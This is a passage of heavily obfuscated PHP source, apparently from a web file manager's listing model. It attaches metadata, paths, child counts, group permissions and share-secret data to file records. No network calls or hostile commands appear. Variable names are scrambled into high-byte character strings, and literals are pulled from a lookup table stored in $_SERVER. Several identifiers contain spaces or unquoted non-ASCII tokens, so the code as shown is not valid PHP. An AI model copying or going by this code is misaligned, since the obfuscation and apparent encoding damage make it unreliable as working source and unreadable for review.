Model($û¬æÑÁÒ[523])->get($û¬æÑÁÒ[524]); $ÎµÄš„Ñ = Model($û¬æÑÁÒ[523])->get($û¬æÑÁÒ[525]); $½Àä‘èú = array($û¬æÑÁÒ[526] => $û¬æÑÁÒ[527], $û¬æÑÁÒ[528] => $û¬æÑÁÒ[529]); $¬ÀàÕ›à = array($û¬æÑÁÒ[32] => $û¬æÑÁÒ[32], $û¬æÑÁÒ[79] => $û¬æÑÁÒ[79], $û¬æÑÁÒ[169] => $û¬æÑÁÒ[489], $û¬æÑÁÒ[530] => $û¬æÑÁÒ[530], $û¬æÑÁÒ[531] => $û¬æÑÁÒ[532], $û¬æÑÁÒ[234] => $û¬æÑÁÒ[234], $û¬æÑÁÒ[88] => $û¬æÑÁÒ[88]); $ŒÒÒé” = Input::get($û¬æÑÁÒ[533], $û¬æÑÁÒ[7], $ş¸á—Íí, array_keys($¬ÀàÕ›à)); $ü¾“îÁœ = Input::get($û¬æÑÁÒ[534], $û¬æÑÁÒ[7], $ÎµÄš„Ñ, array_keys($½Àä‘èú)); if (!in_array($ŒÒÒé”, array_keys($¬ÀàÕ›à))) { $ŒÒÒé” = $û¬æÑÁÒ[32]; } if (!in_array($ü¾“îÁœ, array_keys($½Àä‘èú))) { $ŒÒÒé” = $û¬æÑÁÒ[526]; } if ($ŒÒÒé” == $û¬æÑÁÒ[32]) { } $Æä‚¨¼¹ = $û¬æÑÁÒ[535] . $¬ÀàÕ›à[$ŒÒÒé”] . $û¬æÑÁÒ[53] . $½Àä‘èú[$ü¾“îÁœ]; $Æä‚¨¼¹ = rtrim(trim($Æä‚¨¼¹), $û¬æÑÁÒ[50]); if ($ÓÛ¸â€²) { return array($Æä‚¨¼¹, $½Àä‘èú[$ü¾“îÁœ]); } return $this->order($Æä‚¨¼¹); } protected function _listDataApplyItem($«Á…’åŞ, $«İ‹ ± = false) { $ºşîÑëÄ = array($«Á…’åŞ); $this->_listDataApply($ºşîÑëÄ, $«İ‹ ±); return $ºşîÑëÄ[0]; } protected function _listDataApply(&$éãÈşÀ, $¯ˆ£ìÚ = false) { $õ¥ñ¯¿ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$éãÈşÀ) { $éãÈşÀ = array(); return; } $‘šõºÄŠ = array_to_keyvalue($éãÈşÀ, $õ¥ñ¯¿[12], $õ¥ñ¯¿[194]); $‘šõºÄŠ = array_unique($‘šõºÄŠ); $this->_listSourceCache($éãÈşÀ); if (!$¯ˆ£ìÚ) { $this->_listAppendMeta($éãÈşÀ, $‘šõºÄŠ); $this->_listAppendFileMeta($éãÈşÀ, $‘šõºÄŠ); $this->_listAppendChildren($éãÈşÀ, $‘šõºÄŠ); } $this->_listAppendPath($éãÈşÀ); $this->_listAppendAuth($éãÈşÀ); $this->_listAppendSourceInfo($éãÈşÀ, $‘šõºÄŠ); $this->_listAppendUser($éãÈşÀ); $this->_listFilterInfo($éãÈşÀ, $¯ˆ£ìÚ); $this->_listAppendAuthSecret($éãÈşÀ); } protected function _listSourceCache($š¢ùÌ®) { $±¦Âßøü =& $_SERVER[¼¥ÊĞÙÌ]; foreach ($š¢ùÌ® as $Èø«õ‡à) { self::$cacheSourceInfo[$±¦Âßøü[536] . $Èø«õ‡à[$±¦Âßøü[194]]] = $Èø«õ‡à; } } protected function _listFilterInfo(&$ˆ˜†îï, $¯É›ÃÛ‚ = false) { $Ö±¶Ùªø =& $_SERVER[¼¥ÊĞÙÌ]; foreach ($ˆ˜†îï as &$º¹œ«×) { $º¹œ«× = $this->pathInfoFilter($º¹œ«×); self::$cachePathInfo[$Ö±¶Ùªø[537] . intval($¯É›ÃÛ‚) . $Ö±¶Ùªø[465] . $º¹œ«×[$Ö±¶Ùªø[194]]] = $º¹œ«×; } unset($º¹œ«×); } protected function _listMake(&$ÃáüíÂ) { $¾ò‹İşò =& $_SERVER[¼¥ÊĞÙÌ]; $ÃáüíÂ[$¾ò‹İşò[85]] = array(); $ÃáüíÂ[$¾ò‹İşò[86]] = array(); foreach ($ÃáüíÂ[$¾ò‹İşò[448]] as $ĞÃÅ“Æ) { $“Ü„Áº„ = $ĞÃÅ“Æ[$¾ò‹İşò[488]] == 1 ? $¾ò‹İşò[85] : $¾ò‹İşò[86]; $ÃáüíÂ[$“Ü„Áº„][] = $ĞÃÅ“Æ; } unset($ÃáüíÂ[$¾ò‹İşò[448]]); } protected function _listAppendMeta(&$¥Ï‹ÊŒ˜, $ ¾œ‹¿) { $şÅÇğ« =& $_SERVER[¼¥ÊĞÙÌ]; $Ô…²å—” = array($şÅÇğ«[494] => array($şÅÇğ«[495], $ ¾œ‹¿)); $æ©»ÍàÀ = Model($şÅÇğ«[538])->field($şÅÇğ«[539])->where($Ô…²å—”)->select(); if (!$æ©»ÍàÀ) { return; } $Â”õ³¡š = array($şÅÇğ«[540], $şÅÇğ«[541], $şÅÇğ«[520]); $â•’¨Õ“ = array(); foreach ($æ©»ÍàÀ as $¨º¦—Û¾) { if (!isset($â•’¨Õ“[$¨º¦—Û¾[$şÅÇğ«[194]]])) { $â•’¨Õ“[$¨º¦—Û¾[$şÅÇğ«[194]]] = array(); } if (in_array($¨º¦—Û¾[$şÅÇğ«[97]], $Â”õ³¡š)) { continue; } if ($¨º¦—Û¾[$şÅÇğ«[97]] == $şÅÇğ«[542]) { $¨º¦—Û¾[$şÅÇğ«[453]] = $şÅÇğ«[543]; } $â•’¨Õ“[$¨º¦—Û¾[$şÅÇğ«[194]]][$¨º¦—Û¾[$şÅÇğ«[97]]] = $¨º¦—Û¾[$şÅÇğ«[453]]; } foreach ($¥Ï‹ÊŒ˜ as &$‘ÀùÂå“) { $‘ÀùÂå“[$şÅÇğ«[544]] = !1; if (isset($â•’¨Õ“[$‘ÀùÂå“[$şÅÇğ«[194]]])) { $‘ÀùÂå“[$şÅÇğ«[544]] = $â•’¨Õ“[$‘ÀùÂå“[$şÅÇğ«[194]]]; } if ($this->fileIsLock($‘ÀùÂå“) && $‘ÀùÂå“[$şÅÇğ«[490]]) { $ØêÉüŞ‚ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‘ÀùÂå“[$şÅÇğ«[490]][$şÅÇğ«[491]] = AuthModel::authDisable($‘ÀùÂå“[$şÅÇğ«[490]][$şÅÇğ«[491]], $ØêÉüŞ‚); $‘ÀùÂå“[$şÅÇğ«[490]][$şÅÇğ«[545]][$şÅÇğ«[490]] = $‘ÀùÂå“[$şÅÇğ«[490]][$şÅÇğ«[491]]; } } unset($‘ÀùÂå“); } protected function _listAppendFileMeta(&$†“µ×Â­, $¯²»ªæÊ) { $¡íôçËÈ =& $_SERVER[¼¥ÊĞÙÌ]; $øè‘„¯ = array_to_keyvalue($†“µ×Â­, $¡íôçËÈ[12], $¡íôçËÈ[546]); $øè‘„¯ = array_filter(array_unique($øè‘„¯)); if (!$øè‘„¯) { return; } $–½À‘ = array($¡íôçËÈ[547] => array($¡íôçËÈ[495], $øè‘„¯)); $ØĞ©´¼£ = $¡íôçËÈ[548]; $Ì”çëšÅ = Model($¡íôçËÈ[549])->field($ØĞ©´¼£)->where($–½À‘)->select(); $Ì”çëšÅ = array_to_keyvalue($Ì”çëšÅ, $¡íôçËÈ[546]); $é”òùºŞ = Model($¡íôçËÈ[550])->field($¡íôçËÈ[551])->where($–½À‘)->select(); $é”òùºŞ = $é”òùºŞ ? $é”òùºŞ : array(); $î¨Ö ‘ş = array(); foreach ($é”òùºŞ as $ñ÷Ö‰ğ°) { if (!isset($î¨Ö ‘ş[$ñ÷Ö‰ğ°[$¡íôçËÈ[546]]])) { $î¨Ö ‘ş[$ñ÷Ö‰ğ°[$¡íôçËÈ[546]]] = array(); } $î¨Ö ‘ş[$ñ÷Ö‰ğ°[$¡íôçËÈ[546]]][$ñ÷Ö‰ğ°[$¡íôçËÈ[97]]] = $ñ÷Ö‰ğ°[$¡íôçËÈ[453]]; } foreach ($†“µ×Â­ as &$ú›¸ä…) { $ÔÂ¹…‘Ä = $ú›¸ä…[$¡íôçËÈ[546]]; if (!$ÔÂ¹…‘Ä || !is_array($Ì”çëšÅ[$ÔÂ¹…‘Ä])) { continue; } $ÆÄš¡ù = $Ì”çëšÅ[$ÔÂ¹…‘Ä]; $ÆÄš¡ù[$¡íôçËÈ[79]] = $ú›¸ä…[$¡íôçËÈ[79]]; $ÆÄš¡ù[$¡íôçËÈ[32]] = $ú›¸ä…[$¡íôçËÈ[32]]; if (!$ÆÄš¡ù[$¡íôçËÈ[552]]) { Model($¡íôçËÈ[549])->fileMd5Check($ÆÄš¡ù); } if (!isset(self::$cacheFileInfo[$¡íôçËÈ[553] . $ÔÂ¹…‘Ä])) { self::$cacheFileInfo[$¡íôçËÈ[553] . $ÔÂ¹…‘Ä] = array_merge(array(), $ÆÄš¡ù); } unset($Ì”çëšÅ[$ÔÂ¹…‘Ä][$¡íôçËÈ[87]]); $øÙÒ’¹¤ = isset($î¨Ö ‘ş[$ÔÂ¹…‘Ä]) && is_array($î¨Ö ‘ş[$ÔÂ¹…‘Ä]) ? $î¨Ö ‘ş[$ÔÂ¹…‘Ä] : array(); $ú›¸ä…[$¡íôçËÈ[170]] = array_merge($øÙÒ’¹¤, $Ì”çëšÅ[$ÔÂ¹…‘Ä]); if (isset($ú›¸ä…[$¡íôçËÈ[170]][$¡íôçËÈ[185]])) { $ú›¸ä…[$¡íôçËÈ[185]] = json_decode($ú›¸ä…[$¡íôçËÈ[170]][$¡íôçËÈ[185]], !0); unset($ú›¸ä…[$¡íôçËÈ[170]][$¡íôçËÈ[185]]); } } unset($ú›¸ä…); } protected function _listAppendSourceInfo(&$ˆß“Ú½Ç, $Øûıì) { $µÔï¶œ =& $_SERVER[¼¥ÊĞÙÌ]; $¾äèÖáü = Model($µÔï¶œ[554])->listData(); $–¦™±—® = Model($µÔï¶œ[502])->listData(); $›ˆÕè°½ = Model($µÔï¶œ[492])->listData(); $áŸ–¢ãÀ = Model($µÔï¶œ[555])->listSimple(); $Öù ùşå = array_to_keyvalue($¾äèÖáü, $µÔï¶œ[478]); $æ‚ñö  = array_to_keyvalue_group($–¦™±—®, $µÔï¶œ[87], $µÔï¶œ[503]); $Ä²»úî = array_to_keyvalue($›ˆÕè°½, $µÔï¶œ[87]); $»ŠÁ—Ş = array_to_keyvalue_group($áŸ–¢ãÀ, $µÔï¶œ[194]); foreach ($ˆß“Ú½Ç as &$èîÆªæ) { $èîÆªæ[$µÔï¶œ[90]] = array($µÔï¶œ[556] => 0, $µÔï¶œ[557] => 0, $µÔï¶œ[558] => 0); if (isset($Ä²»úî[$èîÆªæ[$µÔï¶œ[194]]])) { $èîÆªæ[$µÔï¶œ[90]][$µÔï¶œ[559]] = 1; $èîÆªæ[$µÔï¶œ[90]][$µÔï¶œ[560]] = $Ä²»úî[$èîÆªæ[$µÔï¶œ[194]]][$µÔï¶œ[32]]; } if ($æ‚ñö  && $Öù ùşå && isset($æ‚ñö [$èîÆªæ[$µÔï¶œ[194]]])) { $èîÆªæ[$µÔï¶œ[90]][$µÔï¶œ[561]] = array(); foreach ($æ‚ñö [$èîÆªæ[$µÔï¶œ[194]]] as $‘¬£‰¹) { $›²³Œµƒ = $Öù ùşå[$‘¬£‰¹]; $èîÆªæ[$µÔï¶œ[90]][$µÔï¶œ[561]][] = array($µÔï¶œ[562] => $›²³Œµƒ[$µÔï¶œ[478]], $µÔï¶œ[497] => $›²³Œµƒ[$µÔï¶œ[32]], $µÔï¶œ[563] => $›²³Œµƒ[$µÔï¶œ[564]]); } } if ($»ŠÁ—Ş && isset($»ŠÁ—Ş[$èîÆªæ[$µÔï¶œ[194]]])) { $èîÆªæ[$µÔï¶œ[90]][$µÔï¶œ[565]] = array(); foreach ($»ŠÁ—Ş[$èîÆªæ[$µÔï¶œ[194]]] as $ûŒ©›Æı) { $Õã±¢Éú = $µÔï¶œ[566]; if ($ûŒ©›Æı[$µÔï¶œ[567]] == $µÔï¶œ[91]) { $Õã±¢Éú .= $µÔï¶œ[568]; } $èîÆªæ[$µÔï¶œ[90]][$µÔï¶œ[565]] = array_field_key($ûŒ©›Æı, explode($µÔï¶œ[50], $Õã±¢Éú)); } } } unset($èîÆªæ); return $ˆß“Ú½Ç; } protected function _listAppendChildren(&$ñÅ”„ÉÛ, $çË‡È”Ê) { $¼À•óÒ« =& $_SERVER[¼¥ÊĞÙÌ]; $ÁŠÆƒ‰œ = array(); $óêªÁ’ä = array($¼À•óÒ«[242] => 0, $¼À•óÒ«[243] => 0); foreach ($ñÅ”„ÉÛ as &$™–ìËó…) { if (!$™–ìËó…[$¼À•óÒ«[488]]) { continue; } $ÁŠÆƒ‰œ[] = $™–ìËó…[$¼À•óÒ«[194]]; } unset($™–ìËó…); if (!$ÁŠÆƒ‰œ) { return; } $¾Çß†Ø = array($¼À•óÒ«[193] => array($¼À•óÒ«[7], $ÁŠÆƒ‰œ), $¼À•óÒ«[508] => 0); $±ëÍ÷Á· = array($¼À•óÒ«[193], $¼À•óÒ«[488], $¼À•óÒ«[569] => $¼À•óÒ«[570]); $¦§Ìë¤¤ = $this->field($±ëÍ÷Á·)->where($¾Çß†Ø)->group($¼À•óÒ«[571])->select(); $²‘èÄù = array(); foreach ($¦§Ìë¤¤ as $³†ù¢Å±) { $úı˜Øî¡ = $³†ù¢Å±[$¼À•óÒ«[193]]; $ÚÔ·íö = $³†ù¢Å±[$¼À•óÒ«[488]] == $¼À•óÒ«[91] ? $¼À•óÒ«[243] : $¼À•óÒ«[242]; if (!isset($²‘èÄù[$úı˜Øî¡])) { $²‘èÄù[$úı˜Øî¡] = array($¼À•óÒ«[242] => 0, $¼À•óÒ«[243] => 0); } $²‘èÄù[$úı˜Øî¡][$ÚÔ·íö] += $³†ù¢Å±[$¼À•óÒ«[570]]; } foreach ($ñÅ”„ÉÛ as &$™–ìËó…) { if (!$™–ìËó…[$¼À•óÒ«[488]]) { continue; } $ïú€¾™ = is_array($²‘èÄù[$™–ìËó…[$¼À•óÒ«[194]]]) ? $²‘èÄù[$™–ìËó…[$¼À•óÒ«[194]]] : $óêªÁ’ä; $™–ìËó…[$¼À•óÒ«[243]] = $ïú€¾™[$¼À•óÒ«[243]]; $™–ìËó…[$¼À•óÒ«[242]] = $ïú€¾™[$¼À•óÒ«[242]]; unset($™–ìËó…[$¼À•óÒ«[489]]); } unset($™–ìËó…); } protected function _listAppendAuth(&$îç¤·Ê™) { $äıê²˜ö =& $_SERVER[¼¥ÊĞÙÌ]; $í‘¡¤™… = array(); foreach ($îç¤·Ê™ as $Æ¢¦èŸ) { if ($Æ¢¦èŸ[$äıê²˜ö[191]] == self::TYPE_GROUP) { $í‘¡¤™…[] = $Æ¢¦èŸ[$äıê²˜ö[194]]; } } if (!$í‘¡¤™…) { return; } $·¦¹´ûÈ = array_to_keyvalue($îç¤·Ê™, $äıê²˜ö[194]); $ŸÇËã† = Model($äıê²˜ö[572])->getSourceList($í‘¡¤™…, $·¦¹´ûÈ); $„ì¶óû» = KodUser::isRoot(); foreach ($îç¤·Ê™ as $«¬†İÈ => &$Æ¢¦èŸ) { $Æ¢¦èŸ[$äıê²˜ö[490]] = $ŸÇËã†[$Æ¢¦èŸ[$äıê²˜ö[194]]]; if (!$Æ¢¦èŸ[$äıê²˜ö[490]] && $Æ¢¦èŸ[$äıê²˜ö[191]] == self::TYPE_GROUP) { $Æ¢¦èŸ[$äıê²˜ö[490]] = Action($äıê²˜ö[573])->pathGroupAuthMake($Æ¢¦èŸ[$äıê²˜ö[574]]); if (!$Æ¢¦èŸ[$äıê²˜ö[490]] && !$„ì¶óû») { $Æ¢¦èŸ[$äıê²˜ö[236]] = !1; $Æ¢¦èŸ[$äıê²˜ö[235]] = !1; } } if ($Æ¢¦èŸ[$äıê²˜ö[490]]) { $Æ¢¦èŸ[$äıê²˜ö[236]] = AuthModel::authCheckEdit($Æ¢¦èŸ[$äıê²˜ö[490]][$äıê²˜ö[491]]); $Æ¢¦èŸ[$äıê²˜ö[235]] = AuthModel::authCheckView($Æ¢¦èŸ[$äıê²˜ö[490]][$äıê²˜ö[491]]); } $this->groupPathDisplay($Æ¢¦èŸ); } unset($Æ¢¦èŸ); } public function _listAppendAuthSecret(&$ñúÑÖø¯) { $€ÊÃ™šµ =& $_SERVER[¼¥ÊĞÙÌ]; if (Model($€ÊÃ™šµ[511])->get($€ÊÃ™šµ[575]) != $€ÊÃ™šµ[91]) { return; } static $Âõ¨•ğ = false; if (!$Âõ¨•ğ) { $èÖÉáµ€ = Model($€ÊÃ™šµ[576]); $š¯öã†ş = Model($€ÊÃ™šµ[577]); $Âõ¨•ğ = $š¯öã†ş->listData(); $Âõ¨•ğ = array_to_keyvalue($Âõ¨•ğ, $€ÊÃ™šµ[194]); $°‘ØÄÙå = json_decode(Model($€ÊÃ™šµ[511])->get($€ÊÃ™šµ[578]), !0); $°‘ØÄÙå = array_to_keyvalue($°‘ØÄÙå, $€ÊÃ™šµ[478]); foreach ($Âõ¨•ğ as $¸Í¦Ö => $¢¨ ¶ñõ) { $…ÃÖúùô = $°‘ØÄÙå[$¢¨ ¶ñõ[$€ÊÃ™šµ[579]]]; if (!$…ÃÖúùô) { $š¯öã†ş->remove($¢¨ ¶ñõ[$€ÊÃ™šµ[478]]); unset($Âõ¨•ğ[$¸Í¦Ö]); continue; } $“ñ»ä‡– = $èÖÉáµ€->listData($…ÃÖúùô[$€ÊÃ™šµ[490]]); if (!$“ñ»ä‡–) { $š¯öã†ş->remove($¢¨ ¶ñõ[$€ÊÃ™šµ[478]]); unset($Âõ¨•ğ[$¸Í¦Ö]); continue; } $¢¨ ¶ñõ[$€ÊÃ™šµ[490]] = $“ñ»ä‡–; $¢¨ ¶ñõ[$€ÊÃ™šµ[580]] = $…ÃÖúùô; $¢¨ ¶ñõ[$€ÊÃ™šµ[581]] = Model($€ÊÃ™šµ[582])->getInfoSimpleOuter($¢¨ ¶ñõ[$€ÊÃ™šµ[530]]); $Âõ¨•ğ[$¸Í¦Ö] = $¢¨ ¶ñõ; } } $´§ººË¿ = USER_ID; $åÎ©Û†ê = array(); $ÇÏ¬µ¼ö = $this->_listAppendPath($åÎ©Û†ê, !0); foreach ($ñúÑÖø¯ as $¸Í¦Ö => &$¢¨ ¶ñõ) { if (!is_array($¢¨ ¶ñõ[$€ÊÃ™šµ[490]])) { continue; } if ($¢¨ ¶ñõ[$€ÊÃ™šµ[191]] != $€ÊÃ™šµ[583]) { continue; } if (isset($Âõ¨•ğ[$¢¨ ¶ñõ[$€ÊÃ™šµ[194]]])) { $Áå¬µ×Ä = $Âõ¨•ğ[$¢¨ ¶ñõ[$€ÊÃ™šµ[194]]]; if (!is_array($¢¨ ¶ñõ[$€ÊÃ™šµ[544]])) { $¢¨ ¶ñõ[$€ÊÃ™šµ[544]] = array(); } $¢¨ ¶ñõ[$€ÊÃ™šµ[544]][$€ÊÃ™šµ[584]] = $Áå¬µ×Ä[$€ÊÃ™šµ[579]]; $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[585]] = $Áå¬µ×Ä; $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[586]] = $¢¨ ¶ñõ[$€ÊÃ™šµ[587]]; $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[588]] = $€ÊÃ™šµ[91]; if ($Áå¬µ×Ä[$€ÊÃ™šµ[530]] != $´§ººË¿) { $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[491]] = $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[491]] & $Áå¬µ×Ä[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[490]]; } continue; } $™àñ²™ú = $this->parentLevelArray($¢¨ ¶ñõ[$€ÊÃ™šµ[589]]); $ØŒæÄÉÃ = array_reverse($™àñ²™ú); foreach ($ØŒæÄÉÃ as $Úá®ãÊ => $ß½ú°ú) { if (!isset($Âõ¨•ğ[$ß½ú°ú])) { continue; } $Áå¬µ×Ä = $Âõ¨•ğ[$ß½ú°ú]; $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[585]] = $Áå¬µ×Ä; if ($Áå¬µ×Ä[$€ÊÃ™šµ[530]] != $´§ººË¿) { $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[491]] = $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[491]] & $Áå¬µ×Ä[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[490]]; } $ÖñíıØ‹ = $€ÊÃ™šµ[12]; $Ÿ¬íêÃš = count($™àñ²™ú) - $Úá®ãÊ; for ($±®ñ«ë = 0; $±®ñ«ë < $Ÿ¬íêÃš; $±®ñ«ë++) { if (!isset($ÇÏ¬µ¼ö[$™àñ²™ú[$±®ñ«ë]])) { $ÖñíıØ‹ = $€ÊÃ™šµ[12]; break; } $ÖñíıØ‹ = $ÖñíıØ‹ . rtrim($ÇÏ¬µ¼ö[$™àñ²™ú[$±®ñ«ë]], $€ÊÃ™šµ[8]) . $€ÊÃ™šµ[8]; } $¢¨ ¶ñõ[$€ÊÃ™šµ[490]][$€ÊÃ™šµ[586]] = rtrim($ÖñíıØ‹, $€ÊÃ™šµ[8]) . $€ÊÃ™šµ[8]; break; } } unset($¢¨ ¶ñõ); } public function groupPathDisplay(&$ŒÂÑÏˆ) { $Ó…ƒ†¯‰ =& $_SERVER[¼¥ÊĞÙÌ]; if ($ŒÂÑÏˆ[$Ó…ƒ†¯‰[191]] != self::TYPE_GROUP) { return; } $ö›İ¢¼Õ = Model($Ó…ƒ†¯‰[590])->getInfo($ŒÂÑÏˆ[$Ó…ƒ†¯‰[574]]); $à€¿™€¬ = $this->parentLevelArray($ö›İ¢¼Õ[$Ó…ƒ†¯‰[589]]); $¼ñ«­¥Û = $Ó…ƒ†¯‰[12]; foreach ($à€¿™€¬ as $í—ƒ£³) { $Àßè¶õì = Model($Ó…ƒ†¯‰[590])->getInfo($í—ƒ£³); $¼ñ«­¥Û .= $Àßè¶õì[$Ó…ƒ†¯‰[90]][$Ó…ƒ†¯‰[194]] . $Ó…ƒ†¯‰[50]; } $ŒÂÑÏˆ[$Ó…ƒ†¯‰[591]] = $ö›İ¢¼Õ[$Ó…ƒ†¯‰[193]]; $ŒÂÑÏˆ[$Ó…ƒ†¯‰[592]] = $ö›İ¢¼Õ[$Ó…ƒ†¯‰[589]]; $ŒÂÑÏˆ[$Ó…ƒ†¯‰[593]] = $ö›İ¢¼Õ[$Ó…ƒ†¯‰[594]]; $ŒÂÑÏˆ[$Ó…ƒ†¯‰[595]] = $¼ñ«­¥Û . $ö›İ¢¼Õ[$Ó…ƒ†¯‰[90]][$Ó…ƒ†¯‰[194]]; } protected function _listAppendPath(&$Î«Ş¸ÎŸ, $Àˆ¾ßÍ… = false) { $±‡ù± è =& $_SERVER[¼¥ÊĞÙÌ]; static $äÙ˜”€¹ = array(); $Á£„˜ƒÅ = array(); $– ²²†Ø = array(); if ($Àˆ¾ßÍ…) { return $äÙ˜”€¹; } foreach ($Î«Ş¸ÎŸ as &$Ñ³Æ÷¨ë) { $ÂÄŸíÌî = $Ñ³Æ÷¨ë[$±‡ù± è[194]]; if ($Ñ³Æ÷¨ë[$±‡ù± è[488]] == $±‡ù± è[91] && $Ñ³Æ÷¨ë[$±‡ù± è[193]] != 0) { $äÙ˜”€¹[$ÂÄŸíÌî] = $Ñ³Æ÷¨ë[$±‡ù± è[32]]; } if ($Ñ³Æ÷¨ë[$±‡ù± è[488]] == $±‡ù± è[91] && $Ñ³Æ÷¨ë[$±‡ù± è[193]] == 0) { $äÙ˜”€¹[$ÂÄŸíÌî] = $this->_listAppendPathRoot($Ñ³Æ÷¨ë, array()); } if (isset($– ²²†Ø[$Ñ³Æ÷¨ë[$±‡ù± è[589]]])) { continue; } $– ²²†Ø[$Ñ³Æ÷¨ë[$±‡ù± è[589]]] = !0; $ò—¢Âø = $this->parentLevelArray($Ñ³Æ÷¨ë[$±‡ù± è[589]]); foreach ($ò—¢Âø as $›óÃ“˜Á => $© Ãèóº) { if (isset($äÙ˜”€¹[$© Ãèóº])) { continue; } if ($›óÃ“˜Á == 0) { $äÙ˜”€¹[$© Ãèóº] = $this->_listAppendPathRoot($Ñ³Æ÷¨ë, $ò—¢Âø); } if ($›óÃ“˜Á != 0) { $Á£„˜ƒÅ[] = $© Ãèóº; } } } unset($Ñ³Æ÷¨ë); $Á£„˜ƒÅ = array_unique($Á£„˜ƒÅ); if (count($Á£„˜ƒÅ) > 0) { $®…º™«Ã = array($±‡ù± è[494] => array($±‡ù± è[495], $Á£„˜ƒÅ)); if (count($Á£„˜ƒÅ) == 1) { $Õ·ç»˜Ğ = $this->sourceInfo($Á£„˜ƒÅ[0]); $ùŞ Ì¿‘ = is_array($Õ·ç»˜Ğ) ? array($Õ·ç»˜Ğ) : !1; } else { $ùŞ Ì¿‘ = $this->field($±‡ù± è[596])->where($®…º™«Ã)->select(); } if (!$ùŞ Ì¿‘) { $ùŞ Ì¿‘ = array(); } foreach ($ùŞ Ì¿‘ as $šŒ«ıÜ­) { $äÙ˜”€¹[$šŒ«ıÜ­[$±‡ù± è[194]]] = $šŒ«ıÜ­[$±‡ù± è[32]]; } } $†Ğ¾İ¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¬òú¼‚ = array(); foreach ($Î«Ş¸ÎŸ as &$Ñ³Æ÷¨ë) { $½Ÿ½Éõ = $Ñ³Æ÷¨ë[$±‡ù± è[589]]; $ğ‘ÇâÏÃ = $±‡ù± è[12]; if (isset($¬òú¼‚[$½Ÿ½Éõ])) { $ğ‘ÇâÏÃ = $¬òú¼‚[$½Ÿ½Éõ]; } else { $ò—¢Âø = $this->parentLevelArray($Ñ³Æ÷¨ë[$±‡ù± è[589]]); foreach ($ò—¢Âø as $›óÃ“˜Á => $© Ãèóº) { if (isset($äÙ˜”€¹[$© Ãèóº])) { $ğ‘ÇâÏÃ .= $äÙ˜”€¹[$© Ãèóº] . $±‡ù± è[8]; } } $¬òú¼‚[$½Ÿ½Éõ] = $ğ‘ÇâÏÃ; } $ğ‘ÇâÏÃ .= $Ñ³Æ÷¨ë[$±‡ù± è[32]]; if ($Ñ³Æ÷¨ë[$±‡ù± è[488]] == $±‡ù± è[91]) { $ğ‘ÇâÏÃ .= $±‡ù± è[8]; } $Ñ³Æ÷¨ë[$±‡ù± è[587]] = str_replace($±‡ù± è[257], $±‡ù± è[8], $ğ‘ÇâÏÃ); if ($Ñ³Æ÷¨ë[$±‡ù± è[193]] == $±‡ù± è[231]) { $Ñ³Æ÷¨ë[$±‡ù± è[32]] = trim($äÙ˜”€¹[$Ñ³Æ÷¨ë[$±‡ù± è[194]]], $±‡ù± è[8]); $Ñ³Æ÷¨ë[$±‡ù± è[587]] = $Ñ³Æ÷¨ë[$±‡ù± è[32]] . $±‡ù± è[8]; } if (intval($Ñ³Æ÷¨ë[$±‡ù± è[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ñ³Æ÷¨ë, $ò—¢Âø, $†Ğ¾İ¯); } } unset($Ñ³Æ÷¨ë); return $Î«Ş¸ÎŸ; } private function _listAppendPathRecycle(&$¶Ë³öÛ, $õ£ôÖºæ, $é™ìŒ‡œ) { $óÉ‚ÊªÒ =& $_SERVER[¼¥ÊĞÙÌ]; if (!in_array($é™ìŒ‡œ, $õ£ôÖºæ) && $¶Ë³öÛ[$óÉ‚ÊªÒ[194]] != $é™ìŒ‡œ) { return; } $£‹ÊÄÏË = explode($óÉ‚ÊªÒ[8], trim($¶Ë³öÛ[$óÉ‚ÊªÒ[587]], $óÉ‚ÊªÒ[8])); $µïíÂ† = implode($óÉ‚ÊªÒ[8], array_slice($£‹ÊÄÏË, 2)); $¶Ë³öÛ[$óÉ‚ÊªÒ[587]] = $óÉ‚ÊªÒ[8] . LNG($óÉ‚ÊªÒ[597]) . $óÉ‚ÊªÒ[8] . ltrim($µïíÂ†, $óÉ‚ÊªÒ[8]); $¶Ë³öÛ[$óÉ‚ÊªÒ[589]] = $óÉ‚ÊªÒ[598] . implode($óÉ‚ÊªÒ[50], array_slice($õ£ôÖºæ, 1)) . $óÉ‚ÊªÒ[50]; if ($¶Ë³öÛ[$óÉ‚ÊªÒ[194]] == $é™ìŒ‡œ) { $¶Ë³öÛ[$óÉ‚ÊªÒ[589]] = $óÉ‚ÊªÒ[598]; $¶Ë³öÛ[$óÉ‚ÊªÒ[193]] = $óÉ‚ÊªÒ[231]; $¶Ë³öÛ[$óÉ‚ÊªÒ[32]] = LNG($óÉ‚ÊªÒ[597]); } $¶Ë³öÛ[$óÉ‚ÊªÒ[599]] = $óÉ‚ÊªÒ[600]; } protected function _listAppendPathRoot(&$­‘“¤¹…, $ú§õî¢­) { $Ï›ƒÚâƒ =& $_SERVER[¼¥ÊĞÙÌ]; static $ÜŞˆü = false; static $¤»¬Åö“ = false; $¶İäø‹Ó = $Ï›ƒÚâƒ[12]; if ($­‘“¤¹…[$Ï›ƒÚâƒ[191]] == self::TYPE_USER) { if ($­‘“¤¹…[$Ï›ƒÚâƒ[574]] == USER_ID) { $¶İäø‹Ó = LNG($Ï›ƒÚâƒ[601]); if ($ÜŞˆü === !1) { $Ù€ù†×ü = Model($Ï›ƒÚâƒ[602])->getInfoFull(USER_ID); $ÜŞˆü = _get($Ù€ù†×ü, $Ï›ƒÚâƒ[603], $Ï›ƒÚâƒ[12]); } if ($¤»¬Åö“ === !1) { $Ù€ù†×ü = Model($Ï›ƒÚâƒ[602])->getInfoFull(USER_ID); $¤»¬Åö“ = _get($Ù€ù†×ü, $Ï›ƒÚâƒ[604], 